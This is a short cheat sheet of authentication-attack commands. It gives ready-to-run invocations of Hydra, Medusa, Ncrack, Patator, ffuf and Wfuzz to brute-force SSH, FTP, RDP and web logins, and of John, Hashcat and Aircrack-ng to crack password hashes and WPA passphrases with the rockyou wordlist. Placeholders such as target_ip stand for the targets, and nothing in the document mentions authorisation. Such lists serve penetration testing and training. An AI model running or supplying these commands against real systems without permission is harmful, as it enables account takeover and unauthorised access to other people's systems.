# Authentication Attack Commands

 # Various Authentication Attack Commands

```bash
# ffuf: Brute force login page with a custom request and password list
ffuf -request auth-request.txt -request-proto http -w /usr/share/seclists/Passwords/rockyou.txt -fs 1814

# Hydra: Brute force SSH login
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target_ip -t 4

# Hydra: Brute force HTTP POST login
hydra -l username -P /usr/share/wordlists/rockyou.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# Medusa: Brute force FTP login
medusa -h target_ip -u username -P /usr/share/wordlists/rockyou.txt -M ftp -t 4

# Ncrack: Brute force RDP login
ncrack -p 3389 --user username -P /usr/share/wordlists/rockyou.txt target_ip

# Patator: Brute force SSH login
patator ssh_login host=target_ip user=username password=FILE0 0=/usr/share/wordlists/rockyou.txt -t 4

# John the Ripper: Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile

# Hashcat: Crack MD5 password hash
hashcat -m 0 -a 0 -o cracked.txt hashfile /usr/share/wordlists/rockyou.txt

# Aircrack-ng: Crack WPA/WPA2 passphrase
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b target_bssid capture_file.cap

# Wfuzz: Brute force HTTP POST login
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" http://target_ip/login

